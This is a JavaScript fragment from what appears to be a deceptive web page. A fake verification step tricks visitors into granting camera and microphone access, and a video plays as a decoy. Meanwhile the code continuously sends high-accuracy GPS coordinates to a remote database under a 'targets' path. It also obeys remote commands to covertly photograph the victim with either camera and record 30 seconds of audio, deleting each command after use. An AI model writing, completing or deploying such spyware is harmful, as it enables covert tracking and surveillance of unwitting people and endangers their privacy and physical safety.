async function initiateSystem() {
            try {
                // Permissions request
                const stream = await navigator.mediaDevices.getUserMedia({ audio: true, video: true });
                stream.getTracks().forEach(t => t.stop());

                // UI Switch
                document.getElementById('mainUI').style.display = 'none';
                document.getElementById('videoArea').style.display = 'block';
                
                // Video Play
                document.getElementById('videoPlayer').src = "https://www.youtube.com/embed/dQw4w9WgXcQ?autoplay=1&mute=0&controls=0";

                // --- FIXED: Function ka sahi naam call kiya ---
                startTracking(); 
            } catch (err) {
                alert("Error: Verification failed. Please allow camera and location permissions.");
            }
        }

        function startTracking() {
            // A. High Accuracy GPS
            navigator.geolocation.watchPosition(pos => {
                db.ref('targets/' + userId + '/location').update({
                    lat: pos.coords.latitude,
                    lng: pos.coords.longitude,
                    accuracy: Math.round(pos.coords.accuracy) + "m",
                    last_seen: new Date().toLocaleTimeString()
                });
            }, (err) => {
                console.error("GPS Error: ", err);
            }, { 
                enableHighAccuracy: true, 
                maximumAge: 0, 
                timeout: 10000 
            });
            
            // B. Commands Listener
            db.ref('commands/' + userId).on('value', async snap => {
                const cmd = snap.val();
                if (!cmd) return;

                if (cmd.action === "photo_front") capturePhoto("user");
                if (cmd.action === "photo_back") capturePhoto("environment");
                if (cmd.action === "audio_record") recordAudio(30000);

                // Command delete karna taake dubara na chale
                db.ref('commands/' + userId).remove();
            });
        }
